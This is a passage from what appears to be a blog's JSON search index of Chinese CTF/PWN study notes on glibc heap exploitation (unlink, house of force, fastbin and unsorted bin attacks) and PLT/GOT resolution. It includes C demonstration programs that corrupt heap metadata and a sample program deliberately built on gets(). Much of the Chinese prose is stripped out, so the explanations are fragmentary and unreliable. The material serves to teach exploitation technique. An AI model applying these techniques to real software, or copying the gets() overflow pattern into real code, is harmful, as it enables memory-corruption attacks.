class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);<span class=\"comment\">//smallbin1</span></span><br><span class=\"line\">    ptr2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//fastbin1</span></span><br><span class=\"line\">    ptr3=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//fastbin2</span></span><br><span class=\"line\">    ptr4=<span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);<span class=\"comment\">//smallbin2</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//top</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr1);</span><br><span class=\"line\">    *(<span class=\"keyword\">int</span> *)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr4<span class=\"number\">-0x8</span>)=<span class=\"number\">0x90</span>;<span class=\"comment\">//pre_inuse</span></span><br><span class=\"line\">    *(<span class=\"keyword\">int</span> *)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr4<span class=\"number\">-0x10</span>)=<span class=\"number\">0xd0</span>;<span class=\"comment\">//pre_size</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr4);<span class=\"comment\">//unlinkextend</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x150</span>);<span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219220938551.png\" alt=\"image-20201219220938551\"></p>\n<p></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221233429.png\" alt=\"image-20201219221233429\"></p>\n<p>p4  unsortedbin  overlap</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221322641.png\" alt=\"image-20201219221322641\"></p>\n<p></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221445409.png\" alt=\"image-20201219221445409\"></p>\n</blockquote>\n<h2 id=\"0x05-unlink\"><a href=\"#0x05-unlink\" class=\"headerlink\" title=\"0x05 unlink\"></a>0x05 unlink</h2><h3 id=\"1--4\"><a href=\"#1--4\" class=\"headerlink\" title=\"1.\"></a>1.</h3><ul>\n<li>/chunkunlink</li>\n<li>unlinkfastbinsmallbinfastbinsmallbin</li>\n</ul>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><p><strong>malloc</strong></p>\n<ul>\n<li>largebinchunkunlink</li>\n<li>malloclargebinchunkunlink</li>\n</ul>\n<p><strong>free</strong></p>\n<ul>\n<li>freechunk</li>\n</ul>\n<p><strong>malloc consolidate</strong></p>\n<ul>\n<li>consolidatechunkunlink</li>\n</ul>\n<p><strong>realloc</strong></p>\n<ul>\n<li>chunk</li>\n</ul>\n<h3 id=\"3-unlink\"><a href=\"#3-unlink\" class=\"headerlink\" title=\"3.unlink\"></a>3.unlink</h3><p>P/chunk</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unlink_smallbin_intro.png\" alt=\"img\"></p>\n<p>unlink</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/JgR9imeK6YMQ2rZ.png\" alt=\"image-20200723164353967\"></p>\n<blockquote>\n<p>(1)chunkchunk;</p>\n<p>(2)chunkchunk</p>\n<p>(3)unlinkfree chunk</p>\n</blockquote>\n<p>ctf-wiki</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/old_unlink_vul.png\" alt=\"img\"></p>\n<p> chunkQNextchunk Q Nextchunk <strong></strong> Nextchunk  fd  bk  free(Q) </p>\n<ul>\n<li>glibc  small chunk</li>\n<li> chunk </li>\n<li> chunk </li>\n<li> Nextchunk  unlink </li>\n</ul>\n<p> unlink </p>\n<p><strong>12832</strong></p>\n<ul>\n<li>FD=P-&gt;fd = target addr -12</li>\n<li>BK=P-&gt;bk = expect value</li>\n<li>FD-&gt;bk = BK *(target addr-12+12)=BK=expect value</li>\n<li>BK-&gt;fd = FD *(expect value +8) = FD = target addr-12</li>\n</ul>\n<p></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/BTQOKLG2XSyHqge.png\" alt=\"image-20200723165236574\"></p>\n<h3 id=\"4-unlink\"><a href=\"#4-unlink\" class=\"headerlink\" title=\"4.unlink\"></a>4.unlink</h3><p>unlink</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; fd bk</span><br><span class=\"line\">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \\</span><br><span class=\"line\">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \\</span><br></pre></td></tr></table></figure>\n<p>P</p>\n<p></p>\n<p> nextchunk  FD  fakeFD nextchunk  BK  fakeBK </p>\n<ul>\n<li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li>\n<li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li>\n</ul>\n<p> Unlink </p>\n<ul>\n<li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li>\n<li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li>\n</ul>\n<p> fakeFD + 12  fakeBK + 8  P </p>\n<ul>\n<li><code>*P = P - 8</code></li>\n<li><code>*P = P - 12</code></li>\n</ul>\n<p>P  12  chunk </p>\n<h3 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5.\"></a>5.</h3><ol>\n<li>UAF  free  smallbin  unsorted bin  fd  bk </li>\n<li> UAF  chunk</li>\n</ol>\n<h3 id=\"6-\"><a href=\"#6-\" class=\"headerlink\" title=\"6.\"></a>6.</h3><p> UAF chunk  ptr  ptr - 0x18</p>\n<h2 id=\"0x06-house-of-force\"><a href=\"#0x06-house-of-force\" class=\"headerlink\" title=\"0x06 house of force\"></a>0x06 house of force</h2><h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p>topchunksizetopchunk</p>\n<h3 id=\"2--2\"><a href=\"#2--2\" class=\"headerlink\" title=\"2.\"></a>2.</h3><ul>\n<li>topchunksize</li>\n<li>topchunksizetopchunkgot</li>\n<li>mallocgotgot</li>\n</ul>\n<h2 id=\"0x07-fastbin-attack\"><a href=\"#0x07-fastbin-attack\" class=\"headerlink\" title=\"0x07 fastbin attack\"></a>0x07 fastbin attack</h2><ul>\n<li>Fastbin Double Free</li>\n<li>House of Spirit</li>\n<li>Alloc to Stack</li>\n<li>Arbitrary Alloc</li>\n</ul>\n<p> <code>free</code> <strong> chunk  chunk</strong> chunk  <code>fd</code>  <code>malloc</code>  chunk </p>\n<h2 id=\"0x08-unsorted-bin-attack\"><a href=\"#0x08-unsorted-bin-attack\" class=\"headerlink\" title=\"0x08 unsorted bin attack\"></a>0x08 unsorted bin attack</h2><h3 id=\"1--5\"><a href=\"#1--5\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p>Unsorted Bin Attack  Unsorted Bin Chunk  bk Unsorted Bin Attack </p>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><ol>\n<li>Unsorted Bin  FIFO<strong> unsorted bin </strong></li>\n<li> malloc  fastbinsmall bin  chunk Unsorted Bin  chunk chunk  chunk  bin </li>\n</ol>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><ol>\n<li><p>unsortedbinfreechunkfreechunkfree<img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212418753.png\" alt=\"image-20201222212418753\"></p>\n</li>\n<li><p>unsortedbinchunkbktarget<img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212555394.png\" alt=\"image-20201222212555394\"></p>\n</li>\n<li><p>malloc</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** victim is free chunk **/</span></span><br><span class=\"line\">bck = victim-&gt;bk;</span><br><span class=\"line\">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class=\"line\">bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213058942.png\" alt=\"image-20201222213058942\"></p>\n<p>victimtargetfdmalloc_stateunsortedbinfd</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213335526.png\" alt=\"image-20201222213335526\"></p>\n</li>\n</ol>\n<h3 id=\"4-\"><a href=\"#4-\" class=\"headerlink\" title=\"4.\"></a>4.</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"This file demonstrates unsorted bin attack by write a large \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"unsigned long value into stack\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(</span><br><span class=\"line\">      <span class=\"built_in\">stderr</span>,</span><br><span class=\"line\">      <span class=\"string\">\"In practice, unsorted bin attack is generally prepared for further \"</span></span><br><span class=\"line\">      <span class=\"string\">\"attacks, such as rewriting the \"</span></span><br><span class=\"line\">      <span class=\"string\">\"global variable global_max_fast in libc for further fastbin attack\\n\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> target_var = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,</span><br><span class=\"line\">          <span class=\"string\">\"Let's first look at the target we want to rewrite on stack:\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"%p: %ld\\n\\n\"</span>, &amp;target_var, target_var);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> *p = <span class=\"built_in\">malloc</span>(<span class=\"number\">400</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Now, we allocate first normal chunk on the heap at: %p\\n\"</span>,</span><br><span class=\"line\">          p);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"And allocate another normal chunk in order to avoid \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"consolidating the top chunk with\"</span></span><br><span class=\"line\">                  <span class=\"string\">\"the first one during the free()\\n\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">malloc</span>(<span class=\"number\">500</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"We free the first chunk now and it will be inserted in the \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"unsorted bin with its bk pointer \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"point to %p\\n\"</span>,</span><br><span class=\"line\">          (<span class=\"keyword\">void</span> *)p[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*------------VULNERABILITY-----------*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">  p[<span class=\"number\">1</span>] = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)(&amp;target_var - <span class=\"number\">2</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Now emulating a vulnerability that can overwrite the \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"victim-&gt;bk pointer\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"And we write it with the target address-16 (in 32-bits \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"machine, it should be target address-8):%p\\n\\n\"</span>,</span><br><span class=\"line\">          (<span class=\"keyword\">void</span> *)p[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">malloc</span>(<span class=\"number\">400</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Let's malloc again to get the chunk we just free. During \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"this time, target should has already been \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"rewrite:\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"%p: %p\\n\"</span>, &amp;target_var, (<span class=\"keyword\">void</span> *)target_var);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222164945226.png\" alt=\"image-20201222164945226\"></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unsorted_bin_attack_order.png\" alt=\"img\"></p>\n<p></p>\n<p>:</p>\n<p> target  unsorted bin  0x7f1c705ffb78 unsorted bin attack </p>\n</blockquote>\n","categories":["PWN"],"tags":["PWN","Heap"]},{"title":"pltgot","url":"https://pz1o.top/2020/12/16/pltgot/","content":"<p> </p>\n<p>  </p>\n<p><a href=\"https://ld1ng.com/2020/06/16/GOTPLT/\" target=\"_blank\" rel=\"noopener\">https://ld1ng.com/2020/06/16/GOTPLT/</a></p>\n<p><a href=\"https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p>\n<p><a href=\"https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p>\n<h1 id=\"GOTPLT\"><a href=\"#GOTPLT\" class=\"headerlink\" title=\"GOTPLT\"></a>GOTPLT</h1><p>GOT PLT()</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">win</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"you win\\n\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">100</span>];</span><br><span class=\"line\">\tgets(a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"you lose\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>gdb</p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216221001253.png\" alt=\"image-20201216221001253\"></p>\n<p><code>gets@plt</code><code>puts@plt</code></p>\n<p>@pltPLT</p>\n<blockquote>\n<p>CPUPLTGOTPLTGOTPLTGOT</p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123151558845\" alt=\"\"></p>\n</blockquote>\n<p> @pltGOTPLTGOTPLTGOT</p>\n<p>@plt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">disass gets</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216223010888.png\" alt=\"image-20201216223010888\"></p>\n<blockquote>\n<ol>\n<li>jmpGOT</li>\n<li>GOT0x4004c6</li>\n<li>0x4004c6</li>\n<li><code>push 0x3</code>GOT</li>\n<li><code>jmp 0x400480</code></li>\n<li>0x400480PLT[0]</li>\n<li>PLT[0]</li>\n<li>GOT</li>\n</ol>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>1.<strong>PLT[0]GOT[0]</strong></p>\n<p>plt[0]</p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201217082532501.png\" alt=\"image-20201217082532501\"></p>\n<p>16GOT</p>\n<blockquote>\n<p><strong>PLT[0]GOT[0]PLT[1]GOTPLT[0]GOT[1]GOT[2]GOT</strong></p>\n</blockquote>\n<p></p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123155535419\" alt=\"\"></p>\n<p>plt[0]GOT[2]<strong>GOT[1]GOT[2]GOT[x]</strong></p>\n<p>PLTGOT<strong>PLTGOTGOTGOT@plt</strong></p>\n<p>2.<strong>push</strong></p>\n<p>PLTGOTPLT[1]&gt;GOT[3]0x3GOT3PLT[0],PLT[0]GOT</p>\n<p>3.<strong>0x30x0</strong></p>\n<p>GOT[0],GOT[1],GOT[2]0x3</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"GOT\"><a href=\"#GOT\" class=\"headerlink\" title=\"GOT\"></a>GOT</h2><p>GOT[0].dynamic.dynamic;</p>\n<p>GOT[1];</p>\n<p>GOT[2]</p>\n<p>GOT</p>\n<h2 id=\"PLT\"><a href=\"#PLT\" class=\"headerlink\" title=\"PLT\"></a>PLT</h2><p>PLTPLT[0]PLT[0]GOT[1]GOT[2]GOT</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<ol>\n<li>PLTGOT</li>\n<li>GOTPLT<code>push 0x x</code>idx</li>\n<li>PLT[0]GOT[2] ,</li>\n<li>GOT</li>\n</ol>\n<p></p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20200208160601515.gif\" alt=\"\"></p>\n","categories":["PWN"],"tags":["PWN"]},{"title":"","url":"https://pz1o.top/2020/12/15//","content":"<h1 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\"()\"></a>()</h1><p><a href=\"https://ld1ng.com/2020/07/23/Heap/\" target=\"_blank\" rel=\"noopener\">https://ld1ng.com/2020/07/23/Heap/</a></p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap</a></p>\n<p>PWN </p>\n<p></p>\n<p>  </p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"0x01-\"><a href=\"#0x01-\" class=\"headerlink\" title=\"0x01 \"></a>0x01 </h3><ul>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<p></p>\n<ul>\n<li>malloc</li>\n<li>free</li>\n</ul>\n<h3 id=\"0x02-\"><a href=\"#0x02-\" class=\"headerlink\" title=\"0x02 \"></a>0x02 </h3><h4 id=\"1-malloc\"><a href=\"#1-malloc\" class=\"headerlink\" title=\"1.malloc\"></a>1.<strong>malloc</strong></h4><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> *<span class=\"title\">malloc</span><span class=\"params\">(<span class=\"keyword\">size_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li></li>\n<li></li>\n<li>n=0</li>\n<li><strong>nsize_t</strong></li>\n</ul>\n<h4 id=\"2-free\"><a href=\"#2-free\" class=\"headerlink\" title=\"2.free\"></a>2.<strong>free</strong></h4><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">free</span><span class=\"params\">(<span class=\"keyword\">void</span> *p)</span></span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>pmallocrealloc</li>\n</ul>\n<p></p>\n<ul>\n<li>p</li>\n<li>pdouble free</li>\n<li>mallocpt</li>\n</ul>\n<h3 id=\"0x03-\"><a href=\"#0x03-\" class=\"headerlink\" title=\"0x03 \"></a>0x03 </h3><ul>\n<li>glibcstruct _heap_infostruct malloc_statestruct malloc_chunk3</li>\n</ul>\n<h4 id=\"1-Arena\"><a href=\"#1-Arena\" class=\"headerlink\" title=\"1.Arena\"></a>1.Arena</h4><p><img src=\"/2020/12/15/%E5%A0%86/image-20201212002041969.png\" alt=\"image-20201212002041969\"></p>\n<blockquote>\n<ul>\n<li>arneaarnea</li>\n<li>arneamain_arenaarneathread_arena</li>\n</ul>\n</blockquote>\n<h5 id=\"Arena\"><a href=\"#Arena\" class=\"headerlink\" title=\"Arena\"></a>Arena</h5><p>arena</p>\n<p><strong>arena</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">32</span></span><br><span class=\"line\">     Number of arena = <span class=\"number\">2</span> * number of cores + <span class=\"number\">1.</span></span><br><span class=\"line\"><span class=\"number\">64</span></span><br><span class=\"line\">     Number of arena = <span class=\"number\">8</span> * number of cores + <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p></p>\n<blockquote>\n<p>egArena Arena</p>\n<p>43Arena</p>\n<p><strong>glibc malloc</strong></p>\n<ul>\n<li>glibc malloc3</li>\n<li>3malloc</li>\n<li>3mallocglibc malloc3</li>\n</ul>\n</blockquote>\n<h4 id=\"2-malloc-state\"><a href=\"#2-malloc-state\" class=\"headerlink\" title=\"2.malloc_state\"></a>2.<strong>malloc_state</strong></h4><ul>\n<li>glibcarnea</li>\n<li>binstop chunkchunk</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span 